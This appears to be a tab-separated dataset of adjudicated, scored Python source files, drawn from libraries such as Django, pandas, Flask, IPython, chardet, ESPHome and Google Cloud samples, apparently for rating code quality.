21	adjudicated	1	"# Levels<<NEWL>>DEBUG = 10<<NEWL>>INFO = 20<<NEWL>>WARNING = 30<<NEWL>>ERROR = 40<<NEWL>>CRITICAL = 50<<NEWL>><<NEWL>><<NEWL>>class CheckMessage:<<NEWL>><<NEWL>>    def __init__(self, level, msg, hint=None, obj=None, id=None):<<NEWL>>        assert isinstance(level, int), ""The first argument should be level.""<<NEWL>>        self.level = level<<NEWL>>        self.msg = msg<<NEWL>>        self.hint = hint<<NEWL>>        self.obj = obj<<NEWL>>        self.id = id<<NEWL>><<NEWL>>    def __eq__(self, other):<<NEWL>>        return (<<NEWL>>            isinstance(other, self.__class__) and<<NEWL>>            all(getattr(self, attr) == getattr(other, attr)<<NEWL>>                for attr in ['level', 'msg', 'hint', 'obj', 'id'])<<NEWL>>        )<<NEWL>><<NEWL>>    def __str__(self):<<NEWL>>        from django.db import models<<NEWL>><<NEWL>>        if self.obj is None:<<NEWL>>            obj = ""?""<<NEWL>>        elif isinstance(self.obj, models.base.ModelBase):<<NEWL>>            # We need to hardcode ModelBase and Field cases because its __str__<<NEWL>>            # method doesn't return ""applabel.modellabel"" and cannot be changed.<<NEWL>>            obj = self.obj._meta.label<<NEWL>>        else:<<NEWL>>            obj = str(self.obj)<<NEWL>>        id = ""(%s) "" % self.id if self.id else """"<<NEWL>>        hint = ""\n\tHINT: %s"" % self.hint if self.hint else ''<<NEWL>>        return ""%s: %s%s%s"" % (obj, id, self.msg, hint)<<NEWL>><<NEWL>>    def __repr__(self):<<NEWL>>        return ""<%s: level=%r, msg=%r, hint=%r, obj=%r, id=%r>"" % \<<NEWL>>            (self.__class__.__name__, self.level, self.msg, self.hint, self.obj, self.id)<<NEWL>><<NEWL>>    def is_serious(self, level=ERROR):<<NEWL>>        return self.level >= level<<NEWL>><<NEWL>>    def is_silenced(self):<<NEWL>>        from django.conf import settings<<NEWL>>        return self.id in settings.SILENCED_SYSTEM_CHECKS<<NEWL>><<NEWL>><<NEWL>>class Debug(CheckMessage):<<NEWL>>    def __init__(self, *args, **kwargs):<<NEWL>>        super().__init__(DEBUG, *args, **kwargs)<<NEWL>><<NEWL>><<NEWL>>class Info(CheckMessage):<<NEWL>>    def __init__(self, *args, **kwargs):<<NEWL>>        super().__init__(INFO, *args, **kwargs)<<NEWL>><<NEWL>><<NEWL>>class Warning(CheckMessage):<<NEWL>>    def __init__(self, *args, **kwargs):<<NEWL>>        super().__init__(WARNING, *args, **kwargs)<<NEWL>><<NEWL>><<NEWL>>class Error(CheckMessage):<<NEWL>>    def __init__(self, *args, **kwargs):<<NEWL>>        super().__init__(ERROR, *args, **kwargs)<<NEWL>><<NEWL>><<NEWL>>class Critical(CheckMessage):<<NEWL>>    def __init__(self, *args, **kwargs):<<NEWL>>        super().__init__(CRITICAL, *args, **kwargs)"
161	adjudicated	0	"from django.contrib.messages.views import SuccessMessageMixin<<NEWL>>from django.urls import reverse_lazy<<NEWL>>from django.views.generic import ListView<<NEWL>>from django.views.generic.edit import CreateView, UpdateView, DeleteView<<NEWL>>from .forms import FlatForm<<NEWL>>from .mixins import HousesAddMixin, SeveralInstanceCreateMixin<<NEWL>>from .models import Flat<<NEWL>>from django.utils.translation import gettext_lazy as _<<NEWL>><<NEWL>>from ..mixins import LoginRequiredMixinCustom<<NEWL>><<NEWL>><<NEWL>>class FlatCreateView(LoginRequiredMixinCustom, SeveralInstanceCreateMixin,<<NEWL>>                     SuccessMessageMixin, CreateView):<<NEWL>>    form_class = FlatForm<<NEWL>>    template_name = ""flat/create.html""<<NEWL>>    success_url = reverse_lazy('flat_list')<<NEWL>>    login_url = reverse_lazy(""user_login"")<<NEWL>>    extra_context = {<<NEWL>>        'header': _('Create flat'),<<NEWL>>        'button_title': _('Create'),<<NEWL>>    }<<NEWL>>    success_message = _('Flat created successfully')<<NEWL>><<NEWL>><<NEWL>>class FlatListView(LoginRequiredMixinCustom, HousesAddMixin, ListView):<<NEWL>>    model = Flat<<NEWL>>    template_name = ""flat/list.html""<<NEWL>>    extra_context = {<<NEWL>>        ""remove_title"": _(""remove"")<<NEWL>>    }<<NEWL>><<NEWL>><<NEWL>>class FlatUpdateView(LoginRequiredMixinCustom,<<NEWL>>                     SuccessMessageMixin, UpdateView):<<NEWL>>    model = Flat<<NEWL>>    form_class = FlatForm<<NEWL>>    template_name = ""flat/create.html""<<NEWL>>    success_url = reverse_lazy('flat_list')<<NEWL>>    extra_context = {<<NEWL>>        'header': _('Update Flat'),<<NEWL>>        'button_title': _('Update'),<<NEWL>>    }<<NEWL>>    success_message = _('Flat updated successfully')<<NEWL>><<NEWL>><<NEWL>>class FlatDeleteView(LoginRequiredMixinCustom,<<NEWL>>                     SuccessMessageMixin, DeleteView):<<NEWL>>    model = Flat<<NEWL>>    template_name = ""flat/delete.html""<<NEWL>>    success_url = reverse_lazy('flat_list')<<NEWL>>    extra_context = {<<NEWL>>        'header': _('Remove flat'),<<NEWL>>        'button_title': _('Remove '),<<NEWL>>        'message': _('Are you sure delete flat '),<<NEWL>>    }<<NEWL>>    success_message = _('Flat deleted successfully')"
70	adjudicated	4	"""""""Simple function for embedding an IPython kernel<<NEWL>>""""""<<NEWL>># -----------------------------------------------------------------------------<<NEWL>># Imports<<NEWL>># -----------------------------------------------------------------------------<<NEWL>><<NEWL>>import sys<<NEWL>><<NEWL>>from IPython.utils.frame import extract_module_locals<<NEWL>><<NEWL>>from .kernelapp import IPKernelApp<<NEWL>><<NEWL>># -----------------------------------------------------------------------------<<NEWL>># Code<<NEWL>># -----------------------------------------------------------------------------<<NEWL>><<NEWL>><<NEWL>>def embed_kernel(module=None, local_ns=None, **kwargs):<<NEWL>>    """"""Embed and start an IPython kernel in a given scope.<<NEWL>><<NEWL>>    Parameters<<NEWL>>    ----------<<NEWL>>    module : ModuleType, optional<<NEWL>>        The module to load into IPython globals (default: caller)<<NEWL>>    local_ns : dict, optional<<NEWL>>        The namespace to load into IPython user namespace (default: caller)<<NEWL>>    **kwargs : various, optional<<NEWL>>        Further keyword args are relayed to the IPKernelApp constructor,<<NEWL>>        allowing configuration of the Kernel.  Will only have an effect<<NEWL>>        on the first embed_kernel call for a given process.<<NEWL>><<NEWL>>    """"""<<NEWL>>    # get the app if it exists, or set it up if it doesn't<<NEWL>>    if IPKernelApp.initialized():<<NEWL>>        app = IPKernelApp.instance()<<NEWL>>    else:<<NEWL>>        app = IPKernelApp.instance(**kwargs)<<NEWL>>        app.initialize([])<<NEWL>>        # Undo unnecessary sys module mangling from init_sys_modules.<<NEWL>>        # This would not be necessary if we could prevent it<<NEWL>>        # in the first place by using a different InteractiveShell<<NEWL>>        # subclass, as in the regular embed case.<<NEWL>>        main = app.kernel.shell._orig_sys_modules_main_mod<<NEWL>>        if main is not None:<<NEWL>>            sys.modules[app.kernel.shell._orig_sys_modules_main_name] = main<<NEWL>><<NEWL>>    # load the calling scope if not given<<NEWL>>    (caller_module, caller_locals) = extract_module_locals(1)<<NEWL>>    if module is None:<<NEWL>>        module = caller_module<<NEWL>>    if local_ns is None:<<NEWL>>        local_ns = caller_locals<<NEWL>><<NEWL>>    app.kernel.user_module = module<<NEWL>>    app.kernel.user_ns = local_ns<<NEWL>>    app.shell.set_completer_frame()<<NEWL>>    app.start()"
130	adjudicated	4	"""""""<<NEWL>>Given a list of integers, made up of (hopefully) a small number of long runs<<NEWL>>of consecutive integers, compute a representation of the form<<NEWL>>((start1, end1), (start2, end2) ...). Then answer the question ""was x present<<NEWL>>in the original list?"" in time O(log(# runs)).<<NEWL>>""""""<<NEWL>><<NEWL>>import bisect<<NEWL>>from typing import List, Tuple<<NEWL>><<NEWL>>def intranges_from_list(list_: List[int]) -> Tuple[int, ...]:<<NEWL>>    """"""Represent a list of integers as a sequence of ranges:<<NEWL>>    ((start_0, end_0), (start_1, end_1), ...), such that the original<<NEWL>>    integers are exactly those x such that start_i <= x < end_i for some i.<<NEWL>><<NEWL>>    Ranges are encoded as single integers (start << 32 | end), not as tuples.<<NEWL>>    """"""<<NEWL>><<NEWL>>    sorted_list = sorted(list_)<<NEWL>>    ranges = []<<NEWL>>    last_write = -1<<NEWL>>    for i in range(len(sorted_list)):<<NEWL>>        if i+1 < len(sorted_list):<<NEWL>>            if sorted_list[i] == sorted_list[i+1]-1:<<NEWL>>                continue<<NEWL>>        current_range = sorted_list[last_write+1:i+1]<<NEWL>>        ranges.append(_encode_range(current_range[0], current_range[-1] + 1))<<NEWL>>        last_write = i<<NEWL>><<NEWL>>    return tuple(ranges)<<NEWL>><<NEWL>>def _encode_range(start: int, end: int) -> int:<<NEWL>>    return (start << 32) | end<<NEWL>><<NEWL>>def _decode_range(r: int) -> Tuple[int, int]:<<NEWL>>    return (r >> 32), (r & ((1 << 32) - 1))<<NEWL>><<NEWL>><<NEWL>>def intranges_contain(int_: int, ranges: Tuple[int, ...]) -> bool:<<NEWL>>    """"""Determine if `int_` falls into one of the ranges in `ranges`.""""""<<NEWL>>    tuple_ = _encode_range(int_, 0)<<NEWL>>    pos = bisect.bisect_left(ranges, tuple_)<<NEWL>>    # we could be immediately ahead of a tuple (start, end)<<NEWL>>    # with start < int_ <= end<<NEWL>>    if pos > 0:<<NEWL>>        left, right = _decode_range(ranges[pos-1])<<NEWL>>        if left <= int_ < right:<<NEWL>>            return True<<NEWL>>    # or we could be immediately behind a tuple (int_, end)<<NEWL>>    if pos < len(ranges):<<NEWL>>        left, _ = _decode_range(ranges[pos])<<NEWL>>        if left == int_:<<NEWL>>            return True<<NEWL>>    return False"
50	adjudicated	3	"# Copyright (c) Microsoft Corporation. All rights reserved.<<NEWL>># Licensed under the MIT License. See LICENSE in the project root<<NEWL>># for license information.<<NEWL>><<NEWL>>import contextlib<<NEWL>>import os<<NEWL>><<NEWL>><<NEWL>>@contextlib.contextmanager<<NEWL>>def cwd(dirname):<<NEWL>>    """"""A context manager for operating in a different directory.""""""<<NEWL>>    orig = os.getcwd()<<NEWL>>    os.chdir(dirname)<<NEWL>>    try:<<NEWL>>        yield orig<<NEWL>>    finally:<<NEWL>>        os.chdir(orig)<<NEWL>><<NEWL>><<NEWL>>def iter_all_files(root, prune_dir=None, exclude_file=None):<<NEWL>>    """"""Yield (dirname, basename, filename) for each file in the tree.<<NEWL>><<NEWL>>    This is an alternative to os.walk() that flattens out the tree and<<NEWL>>    with filtering.<<NEWL>>    """"""<<NEWL>>    pending = [root]<<NEWL>>    while pending:<<NEWL>>        dirname = pending.pop(0)<<NEWL>>        for result in _iter_files(dirname, pending, prune_dir, exclude_file):<<NEWL>>            yield result<<NEWL>><<NEWL>><<NEWL>>def iter_tree(root, prune_dir=None, exclude_file=None):<<NEWL>>    """"""Yield (dirname, files) for each directory in the tree.<<NEWL>><<NEWL>>    The list of files is actually a list of (basename, filename).<<NEWL>><<NEWL>>    This is an alternative to os.walk() with filtering.""""""<<NEWL>>    pending = [root]<<NEWL>>    while pending:<<NEWL>>        dirname = pending.pop(0)<<NEWL>>        files = []<<NEWL>>        for _, b, f in _iter_files(dirname, pending, prune_dir, exclude_file):<<NEWL>>            files.append((b, f))<<NEWL>>        yield dirname, files<<NEWL>><<NEWL>><<NEWL>>def _iter_files(dirname, subdirs, prune_dir, exclude_file):<<NEWL>>    for basename in os.listdir(dirname):<<NEWL>>        filename = os.path.join(dirname, basename)<<NEWL>>        if os.path.isdir(filename):<<NEWL>>            if prune_dir is not None and prune_dir(dirname, basename):<<NEWL>>                continue<<NEWL>>            subdirs.append(filename)<<NEWL>>        else:<<NEWL>>            # TODO: Use os.path.isfile() to narrow it down?<<NEWL>>            if exclude_file is not None and exclude_file(dirname, basename):<<NEWL>>                continue<<NEWL>>            yield dirname, basename, filename"
110	adjudicated	3	"import glob<<NEWL>>from tempfile import gettempdir<<NEWL>><<NEWL>>import os<<NEWL>><<NEWL>>import errno<<NEWL>><<NEWL>>from cloudinary.cache.storage.key_value_storage import KeyValueStorage<<NEWL>><<NEWL>><<NEWL>>class FileSystemKeyValueStorage(KeyValueStorage):<<NEWL>>    """"""File-based key-value storage""""""<<NEWL>>    _item_ext = "".cldci""<<NEWL>><<NEWL>>    def __init__(self, root_path):<<NEWL>>        """"""<<NEWL>>        Create a new Storage object.<<NEWL>><<NEWL>>        All files will be stored under the root_path location<<NEWL>><<NEWL>>        :param root_path: The base folder for all storage files<<NEWL>>        """"""<<NEWL>>        if root_path is None:<<NEWL>>            root_path = gettempdir()<<NEWL>><<NEWL>>        if not os.path.isdir(root_path):<<NEWL>>            os.makedirs(root_path)<<NEWL>><<NEWL>>        self._root_path = root_path<<NEWL>><<NEWL>>    def get(self, key):<<NEWL>>        if not self._exists(key):<<NEWL>>            return None<<NEWL>><<NEWL>>        with open(self._get_key_full_path(key), 'r') as f:<<NEWL>>            value = f.read()<<NEWL>><<NEWL>>        return value<<NEWL>><<NEWL>>    def set(self, key, value):<<NEWL>>        with open(self._get_key_full_path(key), 'w') as f:<<NEWL>>            f.write(value)<<NEWL>><<NEWL>>        return True<<NEWL>><<NEWL>>    def delete(self, key):<<NEWL>>        try:<<NEWL>>            os.remove(self._get_key_full_path(key))<<NEWL>>        except OSError as e:<<NEWL>>            if e.errno != errno.ENOENT:  # errno.ENOENT - no such file or directory<<NEWL>>                raise  # re-raise exception if a different error occurred<<NEWL>><<NEWL>>        return True<<NEWL>><<NEWL>>    def clear(self):<<NEWL>>        for cache_item_path in glob.iglob(os.path.join(self._root_path, '*' + self._item_ext)):<<NEWL>>            os.remove(cache_item_path)<<NEWL>><<NEWL>>        return True<<NEWL>><<NEWL>>    def _get_key_full_path(self, key):<<NEWL>>        """"""<<NEWL>>        Generate the file path for the key<<NEWL>><<NEWL>>        :param key: The key<<NEWL>><<NEWL>>        :return: The absolute path of the value file associated with the key<<NEWL>>        """"""<<NEWL>>        return os.path.join(self._root_path, key + self._item_ext)<<NEWL>><<NEWL>>    def _exists(self, key):<<NEWL>>        """"""<<NEWL>>        Indicate whether key exists<<NEWL>><<NEWL>>        :param key: The key<<NEWL>><<NEWL>>        :return: bool True if the file for the given key exists<<NEWL>>        """"""<<NEWL>>        return os.path.isfile(self._get_key_full_path(key))"
1	adjudicated	1	"from pandas import (<<NEWL>>    DataFrame,<<NEWL>>    Index,<<NEWL>>    Series,<<NEWL>>)<<NEWL>>import pandas._testing as tm<<NEWL>><<NEWL>><<NEWL>>class TestToFrame:<<NEWL>>    def test_to_frame_respects_name_none(self):<<NEWL>>        # GH#44212 if we explicitly pass name=None, then that should be respected,<<NEWL>>        #  not changed to 0<<NEWL>>        # GH-45448 this is first deprecated to only change in the future<<NEWL>>        ser = Series(range(3))<<NEWL>>        with tm.assert_produces_warning(FutureWarning):<<NEWL>>            result = ser.to_frame(None)<<NEWL>><<NEWL>>        # exp_index = Index([None], dtype=object)<<NEWL>>        exp_index = Index([0])<<NEWL>>        tm.assert_index_equal(result.columns, exp_index)<<NEWL>><<NEWL>>        with tm.assert_produces_warning(FutureWarning):<<NEWL>>            result = ser.rename(""foo"").to_frame(None)<<NEWL>>        exp_index = Index([""foo""], dtype=object)<<NEWL>>        tm.assert_index_equal(result.columns, exp_index)<<NEWL>><<NEWL>>    def test_to_frame(self, datetime_series):<<NEWL>>        datetime_series.name = None<<NEWL>>        rs = datetime_series.to_frame()<<NEWL>>        xp = DataFrame(datetime_series.values, index=datetime_series.index)<<NEWL>>        tm.assert_frame_equal(rs, xp)<<NEWL>><<NEWL>>        datetime_series.name = ""testname""<<NEWL>>        rs = datetime_series.to_frame()<<NEWL>>        xp = DataFrame(<<NEWL>>            {""testname"": datetime_series.values}, index=datetime_series.index<<NEWL>>        )<<NEWL>>        tm.assert_frame_equal(rs, xp)<<NEWL>><<NEWL>>        rs = datetime_series.to_frame(name=""testdifferent"")<<NEWL>>        xp = DataFrame(<<NEWL>>            {""testdifferent"": datetime_series.values}, index=datetime_series.index<<NEWL>>        )<<NEWL>>        tm.assert_frame_equal(rs, xp)<<NEWL>><<NEWL>>    def test_to_frame_expanddim(self):<<NEWL>>        # GH#9762<<NEWL>><<NEWL>>        class SubclassedSeries(Series):<<NEWL>>            @property<<NEWL>>            def _constructor_expanddim(self):<<NEWL>>                return SubclassedFrame<<NEWL>><<NEWL>>        class SubclassedFrame(DataFrame):<<NEWL>>            pass<<NEWL>><<NEWL>>        ser = SubclassedSeries([1, 2, 3], name=""X"")<<NEWL>>        result = ser.to_frame()<<NEWL>>        assert isinstance(result, SubclassedFrame)<<NEWL>>        expected = SubclassedFrame({""X"": [1, 2, 3]})<<NEWL>>        tm.assert_frame_equal(result, expected)"
390	adjudicated	0	"######################## BEGIN LICENSE BLOCK ########################<<NEWL>># The Original Code is mozilla.org code.<<NEWL>>#<<NEWL>># The Initial Developer of the Original Code is<<NEWL>># Netscape Communications Corporation.<<NEWL>># Portions created by the Initial Developer are Copyright (C) 1998<<NEWL>># the Initial Developer. All Rights Reserved.<<NEWL>>#<<NEWL>># Contributor(s):<<NEWL>>#   Mark Pilgrim - port to Python<<NEWL>>#<<NEWL>># This library is free software; you can redistribute it and/or<<NEWL>># modify it under the terms of the GNU Lesser General Public<<NEWL>># License as published by the Free Software Foundation; either<<NEWL>># version 2.1 of the License, or (at your option) any later version.<<NEWL>>#<<NEWL>># This library is distributed in the hope that it will be useful,<<NEWL>># but WITHOUT ANY WARRANTY; without even the implied warranty of<<NEWL>># MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the GNU<<NEWL>># Lesser General Public License for more details.<<NEWL>>#<<NEWL>># You should have received a copy of the GNU Lesser General Public<<NEWL>># License along with this library; if not, write to the Free Software<<NEWL>># Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA<<NEWL>># 02110-1301  USA<<NEWL>>######################### END LICENSE BLOCK #########################<<NEWL>><<NEWL>>from .chardistribution import EUCKRDistributionAnalysis<<NEWL>>from .codingstatemachine import CodingStateMachine<<NEWL>>from .mbcharsetprober import MultiByteCharSetProber<<NEWL>>from .mbcssm import EUCKR_SM_MODEL<<NEWL>><<NEWL>><<NEWL>>class EUCKRProber(MultiByteCharSetProber):<<NEWL>>    def __init__(self) -> None:<<NEWL>>        super().__init__()<<NEWL>>        self.coding_sm = CodingStateMachine(EUCKR_SM_MODEL)<<NEWL>>        self.distribution_analyzer = EUCKRDistributionAnalysis()<<NEWL>>        self.reset()<<NEWL>><<NEWL>>    @property<<NEWL>>    def charset_name(self) -> str:<<NEWL>>        return ""EUC-KR""<<NEWL>><<NEWL>>    @property<<NEWL>>    def language(self) -> str:<<NEWL>>        return ""Korean"""
141	adjudicated	3	"import typing as t<<NEWL>><<NEWL>>try:<<NEWL>>    from blinker import Namespace<<NEWL>><<NEWL>>    signals_available = True<<NEWL>>except ImportError:<<NEWL>>    signals_available = False<<NEWL>><<NEWL>>    class Namespace:  # type: ignore<<NEWL>>        def signal(self, name: str, doc: t.Optional[str] = None) -> ""_FakeSignal"":<<NEWL>>            return _FakeSignal(name, doc)<<NEWL>><<NEWL>>    class _FakeSignal:<<NEWL>>        """"""If blinker is unavailable, create a fake class with the same<<NEWL>>        interface that allows sending of signals but will fail with an<<NEWL>>        error on anything else.  Instead of doing anything on send, it<<NEWL>>        will just ignore the arguments and do nothing instead.<<NEWL>>        """"""<<NEWL>><<NEWL>>        def __init__(self, name: str, doc: t.Optional[str] = None) -> None:<<NEWL>>            self.name = name<<NEWL>>            self.__doc__ = doc<<NEWL>><<NEWL>>        def send(self, *args: t.Any, **kwargs: t.Any) -> t.Any:<<NEWL>>            pass<<NEWL>><<NEWL>>        def _fail(self, *args: t.Any, **kwargs: t.Any) -> t.Any:<<NEWL>>            raise RuntimeError(<<NEWL>>                ""Signalling support is unavailable because the blinker""<<NEWL>>                "" library is not installed.""<<NEWL>>            ) from None<<NEWL>><<NEWL>>        connect = connect_via = connected_to = temporarily_connected_to = _fail<<NEWL>>        disconnect = _fail<<NEWL>>        has_receivers_for = receivers_for = _fail<<NEWL>>        del _fail<<NEWL>><<NEWL>><<NEWL>># The namespace for code signals.  If you are not Flask code, do<<NEWL>># not put signals in here.  Create your own namespace instead.<<NEWL>>_signals = Namespace()<<NEWL>><<NEWL>><<NEWL>># Core signals.  For usage examples grep the source code or consult<<NEWL>># the API documentation in docs/api.rst as well as docs/signals.rst<<NEWL>>template_rendered = _signals.signal(""template-rendered"")<<NEWL>>before_render_template = _signals.signal(""before-render-template"")<<NEWL>>request_started = _signals.signal(""request-started"")<<NEWL>>request_finished = _signals.signal(""request-finished"")<<NEWL>>request_tearing_down = _signals.signal(""request-tearing-down"")<<NEWL>>got_request_exception = _signals.signal(""got-request-exception"")<<NEWL>>appcontext_tearing_down = _signals.signal(""appcontext-tearing-down"")<<NEWL>>appcontext_pushed = _signals.signal(""appcontext-pushed"")<<NEWL>>appcontext_popped = _signals.signal(""appcontext-popped"")<<NEWL>>message_flashed = _signals.signal(""message-flashed"")"
363	adjudicated	0	"import esphome.codegen as cg<<NEWL>>import esphome.config_validation as cv<<NEWL>>from esphome.components import switch<<NEWL>>from esphome.const import ICON_POWER<<NEWL>>from .. import CONF_PIPSOLAR_ID, PIPSOLAR_COMPONENT_SCHEMA, pipsolar_ns<<NEWL>><<NEWL>>DEPENDENCIES = [""uart""]<<NEWL>><<NEWL>>CONF_OUTPUT_SOURCE_PRIORITY_UTILITY = ""output_source_priority_utility""<<NEWL>>CONF_OUTPUT_SOURCE_PRIORITY_SOLAR = ""output_source_priority_solar""<<NEWL>>CONF_OUTPUT_SOURCE_PRIORITY_BATTERY = ""output_source_priority_battery""<<NEWL>>CONF_INPUT_VOLTAGE_RANGE = ""input_voltage_range""<<NEWL>>CONF_PV_OK_CONDITION_FOR_PARALLEL = ""pv_ok_condition_for_parallel""<<NEWL>>CONF_PV_POWER_BALANCE = ""pv_power_balance""<<NEWL>><<NEWL>>TYPES = {<<NEWL>>    CONF_OUTPUT_SOURCE_PRIORITY_UTILITY: (""POP00"", None),<<NEWL>>    CONF_OUTPUT_SOURCE_PRIORITY_SOLAR: (""POP01"", None),<<NEWL>>    CONF_OUTPUT_SOURCE_PRIORITY_BATTERY: (""POP02"", None),<<NEWL>>    CONF_INPUT_VOLTAGE_RANGE: (""PGR01"", ""PGR00""),<<NEWL>>    CONF_PV_OK_CONDITION_FOR_PARALLEL: (""PPVOKC1"", ""PPVOKC0""),<<NEWL>>    CONF_PV_POWER_BALANCE: (""PSPB1"", ""PSPB0""),<<NEWL>>}<<NEWL>><<NEWL>>PipsolarSwitch = pipsolar_ns.class_(""PipsolarSwitch"", switch.Switch, cg.Component)<<NEWL>><<NEWL>>PIPSWITCH_SCHEMA = switch.switch_schema(<<NEWL>>    PipsolarSwitch, icon=ICON_POWER, block_inverted=True<<NEWL>>).extend(cv.COMPONENT_SCHEMA)<<NEWL>><<NEWL>>CONFIG_SCHEMA = PIPSOLAR_COMPONENT_SCHEMA.extend(<<NEWL>>    {cv.Optional(type): PIPSWITCH_SCHEMA for type in TYPES}<<NEWL>>)<<NEWL>><<NEWL>><<NEWL>>async def to_code(config):<<NEWL>>    paren = await cg.get_variable(config[CONF_PIPSOLAR_ID])<<NEWL>><<NEWL>>    for type, (on, off) in TYPES.items():<<NEWL>>        if type in config:<<NEWL>>            conf = config[type]<<NEWL>>            var = await switch.new_switch(conf)<<NEWL>>            await cg.register_component(var, conf)<<NEWL>>            cg.add(getattr(paren, f""set_{type}_switch"")(var))<<NEWL>>            cg.add(var.set_parent(paren))<<NEWL>>            cg.add(var.set_on_command(on))<<NEWL>>            if off is not None:<<NEWL>>                cg.add(var.set_off_command(off))"
223	adjudicated	1	"# Copyright 2016 Google LLC<<NEWL>>#<<NEWL>># Licensed under the Apache License, Version 2.0 (the ""License"");<<NEWL>># you may not use this file except in compliance with the License.<<NEWL>># You may obtain a copy of the License at<<NEWL>>#<<NEWL>>#     http://www.apache.org/licenses/LICENSE-2.0<<NEWL>>#<<NEWL>># Unless required by applicable law or agreed to in writing, software<<NEWL>># distributed under the License is distributed on an ""AS IS"" BASIS,<<NEWL>># WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.<<NEWL>># See the License for the specific language governing permissions and<<NEWL>># limitations under the License.<<NEWL>><<NEWL>>import os<<NEWL>>import uuid<<NEWL>><<NEWL>>import pytest<<NEWL>><<NEWL>>from product_management import create_product, delete_product<<NEWL>>from reference_image_management import (<<NEWL>>    create_reference_image, delete_reference_image, list_reference_images)<<NEWL>><<NEWL>><<NEWL>>PROJECT_ID = os.getenv('GOOGLE_CLOUD_PROJECT')<<NEWL>>LOCATION = 'us-west1'<<NEWL>><<NEWL>>PRODUCT_DISPLAY_NAME = 'fake_product_display_name_for_testing'<<NEWL>>PRODUCT_CATEGORY = 'homegoods'<<NEWL>>PRODUCT_ID = 'test_{}'.format(uuid.uuid4())<<NEWL>><<NEWL>>REFERENCE_IMAGE_ID = 'fake_reference_image_id_for_testing'<<NEWL>>GCS_URI = 'gs://cloud-samples-data/vision/product_search/shoes_1.jpg'<<NEWL>><<NEWL>><<NEWL>>@pytest.fixture(scope=""function"", autouse=True)<<NEWL>>def setup_teardown():<<NEWL>>    # set up<<NEWL>>    create_product(<<NEWL>>        PROJECT_ID, LOCATION, PRODUCT_ID,<<NEWL>>        PRODUCT_DISPLAY_NAME, PRODUCT_CATEGORY)<<NEWL>><<NEWL>>    yield None<<NEWL>><<NEWL>>    # tear down<<NEWL>>    delete_product(PROJECT_ID, LOCATION, PRODUCT_ID)<<NEWL>><<NEWL>><<NEWL>>def test_create_reference_image(capsys):<<NEWL>>    create_reference_image(<<NEWL>>        PROJECT_ID, LOCATION, PRODUCT_ID, REFERENCE_IMAGE_ID,<<NEWL>>        GCS_URI)<<NEWL>>    list_reference_images(PROJECT_ID, LOCATION, PRODUCT_ID)<<NEWL>>    out, _ = capsys.readouterr()<<NEWL>>    assert REFERENCE_IMAGE_ID in out<<NEWL>><<NEWL>><<NEWL>>def test_delete_reference_image(capsys):<<NEWL>>    create_reference_image(<<NEWL>>        PROJECT_ID, LOCATION, PRODUCT_ID, REFERENCE_IMAGE_ID,<<NEWL>>        GCS_URI)<<NEWL>>    list_reference_images(PROJECT_ID, LOCATION, PRODUCT_ID)<<NEWL>>    out, _ = capsys.readouterr()<<NEWL>>    assert REFERENCE_IMAGE_ID in out<<NEWL>><<NEWL>>    delete_reference_image(<<NEWL>>        PROJECT_ID, LOCATION, PRODUCT_ID, REFERENCE_IMAGE_ID)<<NEWL>>    list_reference_images(PROJECT_ID, LOCATION, PRODUCT_ID)<<NEWL>>    out, _ = capsys.readouterr()<<NEWL>>    assert REFERENCE_IMAGE_ID not in out"
332	adjudicated	4	"from __future__ import annotations<<NEWL>><<NEWL>>import numpy as np<<NEWL>><<NEWL>>from pandas._typing import NumpyIndexT<<NEWL>><<NEWL>>from pandas.core.dtypes.common import is_list_like<<NEWL>><<NEWL>><<NEWL>>def cartesian_product(X) -> list[np.ndarray]:<<NEWL>>    """"""<<NEWL>>    Numpy version of itertools.product.<<NEWL>>    Sometimes faster (for large inputs)...<<NEWL>><<NEWL>>    Parameters<<NEWL>>    ----------<<NEWL>>    X : list-like of list-likes<<NEWL>><<NEWL>>    Returns<<NEWL>>    -------<<NEWL>>    product : list of ndarrays<<NEWL>><<NEWL>>    Examples<<NEWL>>    --------<<NEWL>>    >>> cartesian_product([list('ABC'), [1, 2]])<<NEWL>>    [array(['A', 'A', 'B', 'B', 'C', 'C'], dtype='<U1'), array([1, 2, 1, 2, 1, 2])]<<NEWL>><<NEWL>>    See Also<<NEWL>>    --------<<NEWL>>    itertools.product : Cartesian product of input iterables.  Equivalent to<<NEWL>>        nested for-loops.<<NEWL>>    """"""<<NEWL>>    msg = ""Input must be a list-like of list-likes""<<NEWL>>    if not is_list_like(X):<<NEWL>>        raise TypeError(msg)<<NEWL>>    for x in X:<<NEWL>>        if not is_list_like(x):<<NEWL>>            raise TypeError(msg)<<NEWL>><<NEWL>>    if len(X) == 0:<<NEWL>>        return []<<NEWL>><<NEWL>>    lenX = np.fromiter((len(x) for x in X), dtype=np.intp)<<NEWL>>    cumprodX = np.cumproduct(lenX)<<NEWL>><<NEWL>>    if np.any(cumprodX < 0):<<NEWL>>        raise ValueError(""Product space too large to allocate arrays!"")<<NEWL>><<NEWL>>    a = np.roll(cumprodX, 1)<<NEWL>>    a[0] = 1<<NEWL>><<NEWL>>    if cumprodX[-1] != 0:<<NEWL>>        b = cumprodX[-1] / cumprodX<<NEWL>>    else:<<NEWL>>        # if any factor is empty, the cartesian product is empty<<NEWL>>        b = np.zeros_like(cumprodX)<<NEWL>><<NEWL>>    # error: Argument of type ""int_"" cannot be assigned to parameter ""num"" of<<NEWL>>    # type ""int"" in function ""tile_compat""<<NEWL>>    return [<<NEWL>>        tile_compat(<<NEWL>>            np.repeat(x, b[i]),<<NEWL>>            np.product(a[i]),  # pyright: ignore[reportGeneralTypeIssues]<<NEWL>>        )<<NEWL>>        for i, x in enumerate(X)<<NEWL>>    ]<<NEWL>><<NEWL>><<NEWL>>def tile_compat(arr: NumpyIndexT, num: int) -> NumpyIndexT:<<NEWL>>    """"""<<NEWL>>    Index compat for np.tile.<<NEWL>><<NEWL>>    Notes<<NEWL>>    -----<<NEWL>>    Does not support multi-dimensional `num`.<<NEWL>>    """"""<<NEWL>>    if isinstance(arr, np.ndarray):<<NEWL>>        return np.tile(arr, num)<<NEWL>><<NEWL>>    # Otherwise we have an Index<<NEWL>>    taker = np.tile(np.arange(len(arr)), num)<<NEWL>>    return arr.take(taker)"
